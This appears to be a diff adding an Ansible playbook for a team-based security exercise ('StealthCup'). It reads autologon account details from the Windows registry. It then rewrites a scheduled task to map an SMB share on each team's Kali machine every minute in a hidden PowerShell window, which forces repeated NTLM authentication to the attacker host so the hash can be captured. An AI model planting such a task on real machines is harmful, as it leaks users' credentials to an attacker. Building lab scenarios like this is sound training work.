@@ -1,0 +1,78 @@
+---
+- name: Configure Scheduled NTLM Task on Enterprise Client
+  hosts: enterprise:&client
+  gather_facts: false
+  become_method: runas
+  # strategy: free
+
+  tasks:
+    - name: Get DefaultUserName from Registry
+      ansible.windows.win_reg_stat:
+        path: HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+        name: DefaultUserName
+      register: default_username
+
+    - name: Debug DefaultUserName
+      debug:
+        var: default_username
+
+    - name: Get DefaultDomainName from Registry
+      ansible.windows.win_reg_stat:
+        path: HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+        name: DefaultDomainName
+      register: default_domain
+
+    - name: Debug DefaultDomainName
+      debug:
+        var: default_domain
+
+    - name: Set domain\username variable
+      set_fact:
+        domain_username: "{{ default_domain['value'] }}\\{{ default_username['value'] }}"
+
+    - name: Debug domain\username variable
+      debug:
+        msg: "Target User: {{ domain_username }}"
+
+    - name: Split hostname and extract the team part
+      set_fact:
+        team_name: "{{ inventory_hostname.split('_')[0] }}"
+
+    - name: Debug the extracted team name
+      debug:
+        msg: "The team name extracted is {{ team_name }} on {{ inventory_hostname }}"
+
+    - name: Fetch the private IP of the kali machine
+      set_fact:
+        enterprise_kali_ip: "{{ hostvars[team_name ~ '_enterprise_kali']['private_ip_address'] }}"
+
+    - name: Debug Kali IP
+      debug:
+        msg: "Kali IP: {{ enterprise_kali_ip }}"
+
+    - name: Update Scheduled Task with new Kali IP
+      become: yes
+      become_user: "{{ domain_username }}"
+      win_shell: |
+        $TaskName = "StealthCupNTLM"
+        $Task = Get-ScheduledTask -TaskName $TaskName
+        if ($Task) {
+          $Interval = 1 # interval in minutes
+          $Command = "New-SMBMapping -RemotePath \\{{ enterprise_kali_ip }}\plumetech"
+          $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command $Command"
+          $Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes $Interval)
+          Set-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger
+          Stop-ScheduledTask -TaskName $TaskName
+          Start-ScheduledTask -TaskName $TaskName
+        }
+
+    - name: Remove autologon credentials from registry
+      win_regedit:
+        path: HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+        name: "{{ item }}"
+        state: absent
+      with_items:
+        - "DefaultUserName"
+        - "DefaultPassword"
+        - "DefaultDomainName"
+        - "AutoAdminLogon"
